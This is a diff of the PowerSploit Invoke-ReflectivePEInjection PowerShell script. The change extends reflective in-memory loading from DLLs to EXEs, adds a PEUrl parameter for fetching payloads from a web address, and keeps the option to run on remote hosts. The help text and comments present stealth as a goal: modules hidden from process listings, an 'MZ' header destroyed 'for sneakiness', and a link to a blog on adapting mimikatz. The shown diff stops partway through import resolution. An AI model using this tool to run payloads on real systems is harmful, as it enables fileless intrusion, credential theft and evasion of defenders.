@@ -1,13 +1,14 @@
-﻿<#
+﻿
+<#
 .SYNOPSIS
 
-Reflectively loads a DLL in to memory of the Powershell process.
-Because the DLL is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
+Reflectively loads a DLL or EXE in to memory of the Powershell process.
+Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.
 
-This tool can be run on remote servers by supplying a local DLL to load in to memory on the remote system,
-this will load and execute the DLL in to memory without writing any files to disk.
+This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
+this will load and execute the DLL/EXE in to memory without writing any files to disk.
 
-PowerSploit Function: Invoke-ReflectiveDllInjection
+PowerSploit Function: Invoke-ReflectivePEInjection
 Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
@@ -15,11 +16,15 @@ Optional Dependencies: None
 
 .DESCRIPTION
 
-Reflectively loads a DLL in to the powershell process.
+Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process.
 
-.PARAMETER DllPath
+.PARAMETER PEPath
 
-The path of the DLL to load and execute a function from.
+The path of the DLL/EXE to load and execute.
+
+.PARAMETER PEUrl
+
+A URL containing a DLL/EXE to load and execute.
 
 .PARAMETER ComputerName
 
@@ -34,21 +39,33 @@ Optional, the return type of the function being called in the DLL. Default: Void
 
 Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
 Note that the file name on the website can be any file extension.
-Invoke-ReflectiveDllInjection -DllUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
+Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
 
 .EXAMPLE
 
 Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
-Invoke-ReflectiveDllInjection -DllPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
+Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
 
 .EXAMPLE
 
 Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
 	the wchar_t* returned by WStringFunc() from all the computers.
-Invoke-ReflectiveDllInjection -DllPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
+Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
+
+.EXAMPLE
+
+Load DemoEXE and run it locally.
+Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 
 .NOTES
 
+PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
+If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
+return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
+remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
+applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.
+
+For DLL Loading:
 Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
 I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
 the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
@@ -80,25 +97,29 @@ Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-Refl
 Blog: http://clymb3r.wordpress.com/
 Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection
 
+Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
+Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+
 #>
 
-[CmdletBinding(DefaultParameterSetName="LocalHost")]
+[CmdletBinding(DefaultParameterSetName="WebFile")]
 Param(
 	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $true)]
 	[String]
-	$DllPath,
+	$PEPath,
 	
 	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $true)]
-	[String]
-	$DllUrl,
+	[Uri]
+	$PEUrl,
 	
-	[Parameter(Position = 1, Mandatory = $false)]
+	[Parameter(Position = 1)]
 	[String[]]
 	$ComputerName,
 	
-	[Parameter(Position = 2, Mandatory = $false)]
+	[Parameter(Position = 2)]
+    [ValidateSet( 'WString', 'String', 'Void' )]
 	[String]
-	$FuncReturnType,
+	$FuncReturnType = 'Void',
 	
 	[Parameter(Position = 3, Mandatory = $false)]
 	[String]
@@ -107,12 +128,13 @@ Param(
 
 Set-StrictMode -Version 2
 
+
 $RemoteScriptBlock = {
 	[CmdletBinding()]
 	Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[Byte[]]
-		$DllBytes,
+		$PEBytes,
 		
 		[Parameter(Position = 1, Mandatory = $false)]
 		[String]
@@ -556,6 +578,7 @@ $RemoteScriptBlock = {
 		
 		return [BitConverter]::ToInt64($FinalBytes, 0)
 	}
+	
 
 	Function Add-SignedIntAsUnsigned
 	{
@@ -600,6 +623,7 @@ $RemoteScriptBlock = {
 		
 		return [BitConverter]::ToInt64($FinalBytes, 0)
 	}
+	
 
 	Function Compare-Val1GreaterThanVal2AsUInt
 	{
@@ -637,6 +661,7 @@ $RemoteScriptBlock = {
 		
 		return $false
 	}
+	
 
 	Function Convert-UIntToInt
 	{
@@ -650,6 +675,7 @@ $RemoteScriptBlock = {
 		return ([BitConverter]::ToInt64($ValueBytes, 0))
 	}
 	
+	
 	Function Test-MemoryRangeValid
 	{
 		Param(
@@ -659,7 +685,7 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
-		$DllInfo,
+		$PEInfo,
 		
 		[Parameter(Position = 2, Mandatory = $true)]
 		[IntPtr]
@@ -684,17 +710,37 @@ $RemoteScriptBlock = {
 			$FinalEndAddress = $EndAddress
 		}
 		
-		$DllEndAddress = $DllInfo.EndAddress
+		$PEEndAddress = $PEInfo.EndAddress
 		
-		if ((Compare-Val1GreaterThanVal2AsUInt ($DllInfo.DllHandle) ($StartAddress)) -eq $true)
+		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
 		{
 			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
 		}
-		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($DllEndAddress)) -eq $true)
+		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
 		{
 			Throw "Trying to write to memory greater than allocated address range. $DebugString"
 		}
 	}
+	
+	
+	Function Write-BytesToMemory
+	{
+		Param(
+			[Parameter(Position=0, Mandatory = $true)]
+			[Byte[]]
+			$Bytes,
+			
+			[Parameter(Position=1, Mandatory = $true)]
+			[IntPtr]
+			$MemoryAddress
+		)
+	
+		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
+		{
+			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
+		}
+	}
+	
 
 	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
 	Function Get-DelegateType
@@ -724,6 +770,7 @@ $RemoteScriptBlock = {
 	    
 	    Write-Output $TypeBuilder.CreateType()
 	}
+
 
 	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
 	Function Get-ProcAddress
@@ -756,6 +803,7 @@ $RemoteScriptBlock = {
 	    # Return the address of the function
 	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 	}
+
 
 	#Function written by Lee Holmes, Blog: http://www.leeholmes.com/blog/
 	function Invoke-Win32([string] $dllName, [Type] $returnType,  
@@ -825,13 +873,14 @@ $RemoteScriptBlock = {
 	      $parameters[$refParameter - 1].Value = $inputParameters[$refParameter - 1] 
 	   } 
 	} 
+	
 
 	Function Get-ImageNtHeaders
 	{
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[IntPtr]
-		$DllHandle,
+		$PEHandle,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
@@ -840,15 +889,11 @@ $RemoteScriptBlock = {
 		
 		$NtHeadersInfo = New-Object System.Object
 		
-		#Get the DOS header and make sure it is valid
-		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DllHandle, $Win32Types.IMAGE_DOS_HEADER)
-		if ($dosHeader.e_magic -ne 0x5A4D)
-		{
-			throw "Invalid DOS header magic number"
-		}
-		
+		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
+		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, $Win32Types.IMAGE_DOS_HEADER)
+
 		#Get IMAGE_NT_HEADERS
-		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
+		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
 		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
 		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, $Win32Types.IMAGE_NT_HEADERS64)
 		
@@ -861,60 +906,62 @@ $RemoteScriptBlock = {
 		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
 		{
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
-			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name Dll64Bit -Value $true
+			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
 		}
 		else
 		{
 			$imageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, $Win32Types.IMAGE_NT_HEADERS32)
 			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
-			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name Dll64Bit -Value $false
+			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
 		}
 		
 		return $NtHeadersInfo
 	}
 
-	#This function will get the information needed to allocated space in memory for the DLL
-	Function Get-DllBasicInfo
+
+	#This function will get the information needed to allocated space in memory for the PE
+	Function Get-PEBasicInfo
 	{
 		Param(
 		[Parameter( Position = 0, Mandatory = $true )]
 		[Byte[]]
-		$DllBytes,
+		$PEBytes,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
 		$Win32Types
 		)
 		
-		$DllInfo = New-Object System.Object
+		$PEInfo = New-Object System.Object
 		
-		#Write the Dll to memory temporarily so I can get information from it. This is not it's final resting spot.
-		[IntPtr]$UnmanagedDllBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dllBytes.Length)
-		[System.Runtime.InteropServices.Marshal]::Copy($dllBytes, 0, $UnmanagedDllBytes, $dllBytes.Length) | Out-Null
+		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
+		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
+		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
 		
 		#Get NtHeadersInfo
-		$NtHeadersInfo = Get-ImageNtHeaders -DllHandle $UnmanagedDllBytes -Win32Types $Win32Types
+		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
 		
-		#Build a structure with the information which will be needed for allocating memory and writing the DLL to memory
-		$DllInfo | Add-Member -MemberType NoteProperty -Name 'Dll64Bit' -Value ($NtHeadersInfo.Dll64Bit)
-		$DllInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
-		$DllInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
-		$DllInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
+		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
 		
-		#Free the memory allocated above, this isn't where we allocate the dll to memory
-		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedDllBytes)
+		#Free the memory allocated above, this isn't where we allocate the PE to memory
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
 		
-		return $DllInfo
+		return $PEInfo
 	}
 
-	#DllInfo must contain the following NoteProperties:
-	#	DllHandle: An IntPtr to the address the Dll is loaded to in memory
-	Function Get-DllDetailedInfo
+
+	#PEInfo must contain the following NoteProperties:
+	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
+	Function Get-PEDetailedInfo
 	{
 		Param(
 		[Parameter( Position = 0, Mandatory = $true)]
 		[IntPtr]
-		$DllHandle,
+		$PEHandle,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
@@ -925,47 +972,47 @@ $RemoteScriptBlock = {
 		$Win32Constants
 		)
 		
-		if ($DllHandle -eq $null -or $DllHandle -eq [IntPtr]::Zero)
+		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
 		{
-			throw 'DllHandle is null or IntPtr.Zero'
+			throw 'PEHandle is null or IntPtr.Zero'
 		}
 		
-		$DllInfo = New-Object System.Object
+		$PEInfo = New-Object System.Object
 		
 		#Get NtHeaders information
-		$NtHeadersInfo = Get-ImageNtHeaders -DllHandle $DllHandle -Win32Types $Win32Types
+		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
 		
-		#Build the DllInfo object
-		$DllInfo | Add-Member -MemberType NoteProperty -Name DllHandle -Value $DllHandle
-		$DllInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
-		$DllInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
-		$DllInfo | Add-Member -MemberType NoteProperty -Name Dll64Bit -Value ($NtHeadersInfo.Dll64Bit)
+		#Build the PEInfo object
+		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
+		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
+		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
 		
-		if ($DllInfo.Dll64Bit -eq $true)
+		if ($PEInfo.PE64Bit -eq $true)
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_NT_HEADERS64)))
-			$DllInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_NT_HEADERS64)))
+			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
 		}
 		else
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_NT_HEADERS32)))
-			$DllInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_NT_HEADERS32)))
+			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
 		}
 		
 		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
 		{
-			$DllInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
+			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
 		}
 		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
 		{
-			$DllInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
+			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
 		}
 		else
 		{
 			Throw "PE file is not an EXE or DLL"
 		}
 		
-		return $DllInfo
+		return $PEInfo
 	}
 
 	Function Copy-Sections
@@ -973,11 +1020,11 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[Byte[]]
-		$DllBytes,
+		$PEBytes,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
-		$DllInfo,
+		$PEInfo,
 		
 		[Parameter(Position = 2, Mandatory = $true)]
 		[System.Object]
@@ -988,13 +1035,13 @@ $RemoteScriptBlock = {
 		$Win32Types
 		)
 		
-		for( $i = 0; $i -lt $DllInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
+		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_SECTION_HEADER)))
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_SECTION_HEADER)))
 			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, $Win32Types.IMAGE_SECTION_HEADER)
 		
 			#Address to copy the section to
-			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.DllHandle) ([Int64]$SectionHeader.VirtualAddress))
+			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
 			
 			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
 			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
@@ -1014,8 +1061,8 @@ $RemoteScriptBlock = {
 			
 			if ($SizeOfRawData -gt 0)
 			{
-				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -DllInfo $DllInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
-				[System.Runtime.InteropServices.Marshal]::Copy($DllBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
+				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
+				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
 			}
 		
 			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
@@ -1023,7 +1070,7 @@ $RemoteScriptBlock = {
 			{
 				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
 				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
-				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -DllInfo $DllInfo -StartAddress $StartAddress -Size $Difference | Out-Null
+				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
 				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
 			}
 		}
@@ -1035,7 +1082,7 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[System.Object]
-		$DllInfo,
+		$PEInfo,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[Int64]
@@ -1054,26 +1101,26 @@ $RemoteScriptBlock = {
 		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
 		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_BASE_RELOCATION)
 		
-		#If the Dll was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
-		if (($OriginalImageBase -eq [Int64]$DllInfo.DllHandle) `
-				-or ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
+		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
+		if (($OriginalImageBase -eq [Int64]$PEInfo.PEHandle) `
+				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
 		{
 			return
 		}
 
 
-		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($DllInfo.DllHandle)) -eq $true)
+		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.PEHandle)) -eq $true)
 		{
-			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($DllInfo.DllHandle)
+			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.PEHandle)
 			$AddDifference = $false
 		}
-		elseif ((Compare-Val1GreaterThanVal2AsUInt ($DllInfo.DllHandle) ($OriginalImageBase)) -eq $true)
+		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($OriginalImageBase)) -eq $true)
 		{
-			$BaseDifference = Sub-SignedIntAsUnsigned ($DllInfo.DllHandle) ($OriginalImageBase)
+			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalImageBase)
 		}
 		
 		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
-		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.DllHandle) ([Int64]$DllInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
+		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
 		while($true)
 		{
 			#If SizeOfBlock == 0, we are done
@@ -1084,7 +1131,7 @@ $RemoteScriptBlock = {
 				break
 			}
 
-			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.DllHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
+			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
 			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
 
 			#Loop through each relocation
@@ -1103,11 +1150,12 @@ $RemoteScriptBlock = {
 				}
 
 				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
+				#This appears to be true for EXE's as well.
 				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
 				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
 						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
 				{			
-					#Get the current memory address and update it based off the difference between Dll expected base address and actual base address
+					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
 					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
 					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [IntPtr])
 		
@@ -1139,7 +1187,7 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[System.Object]
-		$DllInfo,
+		$PEInfo,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
@@ -1151,20 +1199,12 @@ $RemoteScriptBlock = {
 		
 		[Parameter(Position = 3, Mandatory = $true)]
 		[System.Object]
-		$Win32Constants,
-		
-		[Parameter(Position = 4)]
-		[String]
-		$ExeArguments,
-		
-		[Parameter(Position = 5)]
-		[IntPtr]
-		$ExeDoneBytePtr
+		$Win32Constants
 		)
 		
-		if ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
+		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
 		{
-			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$DllInfo.DllHandle) ([Int64]$DllInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
 			
 			while ($true)
 			{
@@ -1177,20 +1217,20 @@ $RemoteScriptBlock = {
 						-and $ImportDescriptor.Name -eq 0 `
 						-and $ImportDescriptor.TimeDateStamp -eq 0)
 				{
-					Write-Debug "Done importing DLL imports"
+					Write-Verbose "Done importing DLL imports"
 					break
 				}
 
-				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$DllInfo.DllHandle) ([Int64]$ImportDescriptor.Name)))
+				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
 				$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
-				
+
 				if ($ImportDllHandle -eq $null)
 				{
 					throw "Error importing DLL, DLLName: $ImportDllPath"
 				}
 				
 				#Get the first thunk, then loop through all of them
-				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($ImportDescriptor.FirstThunk)
+				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
 				[IntPtr]$ThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ThunkRef, [IntPtr])
 				
 				while ($ThunkRefVal -ne [IntPtr]::Zero)
@@ -1206,180 +1246,15 @@ $RemoteScriptBlock = {
 					}
 					else
 					{
-						$StringAddr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($ThunkRefVal)
+						$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ThunkRefVal)
 						$StringAddr = Add-SignedIntAsUnsigned ($StringAddr) ([System.Runtime.InteropServices.Marshal]::SizeOf([UInt16]))
 						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
 					}
 					
-					[IntPtr]$NewThunkRef = [IntPtr]::Zero
-					
-					#This is how we give an EXE it's parameters. The loader (crt0.c in the case of c++) will make a call to GetCommandLine in 
-					#	kernel32.dll. Instead of letting it do this, I have written extremely small shellcode which will return a memory address.
-					#	So we allocate the command line string on to the heap, write its address in to the shellcode, and instead of giving
-					#	the EXE the real address to GetCommandLine we give it the address of the shellcode
-					if ($DllInfo.FileType -ieq "EXE" -and ($ProcedureName -ceq "GetCommandLineW" -or $ProcedureName -ceq "GetCommandLineA"))
+					[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
+					if ($NewThunkRef -eq $null)
 					{
-						Write-Debug "Found GetCommandLine"
-						[IntPtr]$CmdLineArgsPtr = [IntPtr]::Zero
-						if ($ProcedureName -ceq "GetCommandLineW")
-						{
-							$CmdLineArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
-						}
-						else
-						{
